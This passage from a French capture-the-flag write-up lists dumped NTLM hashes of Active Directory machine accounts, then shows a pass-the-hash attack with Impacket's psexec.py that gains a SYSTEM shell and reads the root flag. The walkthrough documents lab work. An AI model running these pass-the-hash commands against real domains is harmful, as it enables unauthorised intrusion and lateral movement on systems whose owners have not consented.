PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::

**Liste de hash NTLM de compte de service AD !!!**

### PASS-THE-HASH

``psexec.py -hashes :"c47b45f5d4df5a494bd19f13e14f7902" "SOUPEDECODE.LOCAL"/"WebServer$"@"$TARGET"``

        Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies
        [-] SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.

``psexec.py -hashes :"e41da7e79a4c76dbd9cf79d1cb325559" "SOUPEDECODE.LOCAL"/"FileServer$"@"$TARGET"``

        Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies

        [*] Requesting shares on 10.10.0.62.....
        [*] Found writable share ADMIN$
        [*] Uploading file eUFALcFk.exe
        [*] Opening SVCManager on 10.10.0.62.....
        [*] Creating service GhIc on 10.10.0.62.....
        [*] Starting service GhIc.....
        [!] Press help for extra shell commands
        Microsoft Windows [Version 10.0.20348.587]
        (c) Microsoft Corporation. All rights reserved.

        C:\Windows\system32>
        C:\Users\Administrator\Desktop> type root.txt
        27cb2be302c...f56a

**FLAG ROOT TROUVÉ**

